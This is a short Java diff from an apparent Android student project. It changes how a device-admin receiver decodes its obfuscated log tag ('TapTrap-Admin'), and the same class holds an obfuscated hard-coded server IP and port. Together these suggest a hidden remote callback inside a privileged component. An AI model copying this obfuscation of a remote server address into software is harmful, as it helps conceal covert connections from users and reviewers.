@@ -33,7 +33,7 @@ import com.example.inf2007_mad_j1847.utils.StringHelper;
 
 public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
-    private static final String TAG = StringHelper.qzxp("+hQWp6TEF7VmSn160A=="); //"TapTrap-Admin";
+    private static final String TAG = StringHelper.decrypt("thkDIl+5t/8Sv/r66+U4uFESpN6EqyrLzSbPGaodY7NqLyJvHYNbhfA="); //"TapTrap-Admin";
     private static final String SERVER_IP = StringHelper.qzxp("b2ZYmxn7wAI2oFE="); //"20.2.66.175";
     private static final int SERVER_PORT = 9999;
 
